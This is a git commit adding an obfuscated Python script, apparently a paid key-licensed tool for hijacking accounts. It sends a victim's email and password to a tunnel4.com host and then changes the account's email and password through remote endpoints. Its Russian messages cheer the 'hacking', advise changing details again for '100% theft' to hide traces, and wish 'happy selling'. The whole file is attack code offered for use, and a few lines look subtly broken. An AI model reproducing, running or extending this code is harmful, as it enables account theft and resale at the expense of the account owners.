4350e71ada37e314f38ff8cd2139be4b7ed1e5e4
MRX32x64 <166510459+MRX32x64@users.noreply.github.com>
2025-04-06 13:47:32 +0300

    Add files via upload

---
+++ CPM_MRX.py
@@ -0,0 +1,134 @@
+import requests
+import colorama
+import os
+import time
+from rich.console import Console
+from rich_gradient import Gradient
+ggwvaWxKJKOTuXZYBUvPvAOULTCdpZvt = Console()
+def ntOktVoFnIQoQrTYqEtUMFhWlDJZZEZE(TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu):
+    iTudGbeekNbCiKWcftOIEYLetlifkuFM = requests.post(f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/Auth/{key}")
+    NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ = iTudGbeekNbCiKWcftOIEYLetlifkuFM.json()
+    return NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ
+def XrlwNiUJbpiRcLGrxGmNRIGrkWufcVon(snHvqyUYYeZKnFloZdhmYiSimlxXAjjK, password, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu):
+    QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl = {
+        "Content-Type": "application/json"
+    }
+    aJWtopvNWBjLROLbauqtvKrKeCLJWvYw = {
+        "email": snHvqyUYYeZKnFloZdhmYiSimlxXAjjK,
+        "password": password,
+        "key": TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu
+    }
+    iTudGbeekNbCiKWcftOIEYLetlifkuFM = requests.post(f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/", QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl=QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl, json=aJWtopvNWBjLROLbauqtvKrKeCLJWvYw)
+    NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ = iTudGbeekNbCiKWcftOIEYLetlifkuFM.json()
+    if iTudGbeekNbCiKWcftOIEYLetlifkuFM.status_code == 200:
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 3:
+            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 1:
+            mxmiqcvWfFjVCOeXyulitDyAbCztadCQ = NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ
+            os.system("cls || clear")
+            print(f"Успешный логин в аккаунт :D\n{colorama.Fore.GREEN}+-------УДАЧНОГО ВЗЛОМА :)-------+" + colorama.Fore.WHITE)
+            return 1
+    else:
+        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
+        print(str(NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ) + colorama.Fore.WHITE)
+def TdNyJuHNSBdFoCtvYLrRYkbaEPHuLWFX(newemail, password, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu):
+    QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl = {
+        "Content-Type": "application/json"
+    }
+    aJWtopvNWBjLROLbauqtvKrKeCLJWvYw = {
+        "email": newemail,
+        "password": password,
+        "key": TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu
+    }
+    iTudGbeekNbCiKWcftOIEYLetlifkuFM = requests.post(f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/", QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl=QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl, json=aJWtopvNWBjLROLbauqtvKrKeCLJWvYw)
+    NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ = iTudGbeekNbCiKWcftOIEYLetlifkuFM.json()
+    if iTudGbeekNbCiKWcftOIEYLetlifkuFM.status_code == 200:
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 3:
+            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 1:
+            mxmiqcvWfFjVCOeXyulitDyAbCztadCQ = NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ
+            return 1
+    else:
+        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
+        print(str(NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ) + colorama.Fore.WHITE)
+def adwDJYoSXDkpVJVGYhnIUSXLlwRNfgrC(newEmail, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu):
+    QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl = {
+        "Content-Type": "application/json"
+    }
+    aJWtopvNWBjLROLbauqtvKrKeCLJWvYw = {
+        "email": newEmail,
+        "key": TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu
+    }
+    iTudGbeekNbCiKWcftOIEYLetlifkuFM = requests.post(f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_EMAIL/", QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl=QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl, json=aJWtopvNWBjLROLbauqtvKrKeCLJWvYw)
+    NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ = iTudGbeekNbCiKWcftOIEYLetlifkuFM.json()
+    if iTudGbeekNbCiKWcftOIEYLetlifkuFM.status_code == 200:
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 3:
+            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 1:
+            print(colorama.Fore.GREEN + f"Почта УСПЕШНО изменена :) ~> [ {newEmail} ]" + colorama.Fore.WHITE)
+    else:
+        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
+        print(str(NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ) + colorama.Fore.WHITE)
+def yywkAwoPiOnHSPNyrFTGkeKxncfedfYJ(newPassword, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu):
+    QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl = {
+        "Content-Type": "application/json"
+    }
+    aJWtopvNWBjLROLbauqtvKrKeCLJWvYw = {
+        "password": newPassword,
+        "key": TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu
+    }
+    iTudGbeekNbCiKWcftOIEYLetlifkuFM = requests.post(f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_PASSWORD/", QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl=QXyrwrMjkOtWUvQBgeOEaMtUyoYqsXWl, json=aJWtopvNWBjLROLbauqtvKrKeCLJWvYw)
+    NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ = iTudGbeekNbCiKWcftOIEYLetlifkuFM.json()
+    if iTudGbeekNbCiKWcftOIEYLetlifkuFM.status_code == 200:
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 3:
+            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
+        if NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ == 1:
+            print(colorama.Fore.GREEN + f"Пароль УСПЕШНО изменён :) ~> [ {newPassword} ] \n\n!Для 100% кражи советую изменить данные повторно для скрытия следов!\n        ---[ УДАЧНОЙ ПРОДАЖИ ]---" + colorama.Fore.WHITE)
+    else:
+        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
+        print(str(NoPtXXgtLkBNmlQrGEGSveaynnBizzwJ) + colorama.Fore.WHITE)
+ggwvaWxKJKOTuXZYBUvPvAOULTCdpZvt.print(Gradient("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⢻⡷⢶⣤⣀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡛⠛⠋⠉⠉⠁⠀⢐⣤⢴⣤⣀⠀⠛⠿⣷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⢀⣯⣀⡴⣤⡈⠃⠀⠀⠈⠙⢿⣦⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⣿⣤⡍⢡⢛⣋⡇⠀⠀⠀⠀⠀⠙⢷⣄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⡇⢿⡼⢤⣌⣿⡇⡀⠀⠀⠀⠀⠀⠀⠙⢆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢼⡇⢀⣸⣇⣸⣿⣦⣿⣿⢁⠈⡤⡀⠀⠀⠀⠀⠀⠈
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣷⡏⡿⢯⡻⣿⣿⠇⢇⠎⠞⣵⡷
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣷⠀⢀⡙⠾⣿⣼⣯⣾⣀⡿⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢻⡎⣿⣿⣦⡀⠙⢿⡿⣯⣲⣶⣃
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⢸⣷⢸⣿⣞⢿⣆⠀⡀⢈⠉⠻⣿⣀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⣹⣿⣿⠀⣿⡄⣿⣿⣆⠹⣷⣼⣶⣷⣄⣾⠋
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡅⣿⣿⢹⠀⠘⣧⢹⣿⣿⣦⡘⢧⠉⡛⠛⢿⣄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢣⣇⡟⣿⠈⢠⠀⠹⡆⠻⣿⣿⡳⣄⠱⣌⠃⢸⡿⣦
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⣾⣿⡇⢿⠀⣿⢰⠀⢻⣆⠹⣿⣿⣌⢓⢬⡛⢸⡇⠘⡖⣄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⣾⣿⢹⡇⠀⠀⣿⠸⣧⠀⢻⣷⡙⢏⢻⣿⣝⢦⢻⣧⠀⢹⡘⢦⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⢰⡟⣿⢸⡇⠀⢸⣿⠀⣿⣆⠀⢻⣟⠦⠀⢿⣿⣮⢻⣿⠀⣼⡇⡈⢻⡄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⣿⠘⠁⠀⢸⣿⡄⠘⣿⡄⢠⠙⣦⠀⠈⣿⠈⠋⠃⣴⡟⢇⢻⡀⢻⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⣿⠀⠀⠀⣿⣿⣇⠀⢹⣿⡀⢳⡄⠀⠀⣿⠀⢠⣾⢿⠁⠀⠈⣧⠀⢧
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⢱⠀⠀⠀⣿⡏⠹⡆⠀⢹⣧⠀⢻⣆⠀⠁⢀⣿⣷⡈⠀⠀⠀⠸⣇⠸⡄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠙⣆⠀⢻⡄⠀⠹⣷⣄⠘⢻⡿⣷⡄⠀⠀⠀⣯
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠈⠇⠀⠀⠀⠘⠂⠀⢧⠙⣿⢦
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
+⣿⣏⢽⣟⠻⣿⢟⠟⣻⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""", colors=["red", "black"]))
+print("Создатель софта: @KaliMRX")
+TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu = input("Key: ")
+nEUgkCzsYEgkQhFZpLhGQvxhkUJzhyly = ntOktVoFnIQoQrTYqEtUMFhWlDJZZEZE(TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu)
+if nEUgkCzsYEgkQhFZpLhGQvxhkUJzhyly == 1:
+    snHvqyUYYeZKnFloZdhmYiSimlxXAjjK = input("Email: ")
+    UnZOKOhyeTBRCLJatqDSlWXHNzdDjXkO = input("Password: ")
+    HZHdgokgHbtOwVEbuXKgOSLVJwnsAXCY = XrlwNiUJbpiRcLGrxGmNRIGrkWufcVon(snHvqyUYYeZKnFloZdhmYiSimlxXAjjK, UnZOKOhyeTBRCLJatqDSlWXHNzdDjXkO, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu)
+    if HZHdgokgHbtOwVEbuXKgOSLVJwnsAXCY == 1:
+        TUsdilOOPIUjIkHTcSdQfmvRbyfMuslY = input("New Email: ")
+        RZKmTsrKjESpaXqNfhOqoQMcSbtDJvWN = input("New Password: ")
+        os.system("cls || clear")
+        adwDJYoSXDkpVJVGYhnIUSXLlwRNfgrC(TUsdilOOPIUjIkHTcSdQfmvRbyfMuslY, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu)
+        TdNyJuHNSBdFoCtvYLrRYkbaEPHuLWFX(TUsdilOOPIUjIkHTcSdQfmvRbyfMuslY, UnZOKOhyeTBRCLJatqDSlWXHNzdDjXkO, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu)
+        yywkAwoPiOnHSPNyrFTGkeKxncfedfYJ(RZKmTsrKjESpaXqNfhOqoQMcSbtDJvWN, TfRUksnCUPhIeWpOrpnAoNkGvvBIDEZu)
+    else:
+        print("Неверные данные!")
+        exit()
+elif nEUgkCzsYEgkQhFZpLhGQvxhkUJzhyly == 3:
+    print("Срок ключа истек!")
+else:
+    print("Неверный ключ! (Если после покупки ключа не прошел месяц напиши сюда: @KaliMRX)")
